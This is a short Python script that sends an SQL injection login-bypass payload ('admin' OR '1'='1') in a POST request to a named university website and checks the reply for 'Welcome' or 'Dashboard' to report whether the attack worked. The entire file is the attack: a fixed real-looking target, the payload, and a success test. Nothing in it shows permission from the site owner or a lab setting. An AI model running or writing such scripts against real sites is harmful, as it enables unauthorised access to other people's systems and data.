import requests

# target url
url = "https://miva.university/"

# define SQL injection payload with fields "username" and "password" (what we are pushing to the url)
payload = {
    "username": "admin' OR '1'='1",
    "password": "Password",
}

#handle the pushing safely
try:
    # send POST request with payload (push payload to "https://miva.university/" and store the reponse of the website in the "reponse" variable)
    reponse = requests.post(url, data=payload)

    # Check if the reponse indicates a successful injection by showing text such as "Welcome" or "Dashboard"
    if "Welcome" in reponse.text or "Dashboard" in reponse.text:
        # print a message showing success
        print('Wow, the SQL injection was successful - Vulnerability found')
    else:
        # print a message showing unsuccess
        print('Noo, the SQL Injection was unsuccessful - No Vulnerability Found')
        
        #handle any exception you may or may not expect that is outside the previously stated conditions
except requests.RequestException as e:
    print(f"Error during request: {e}")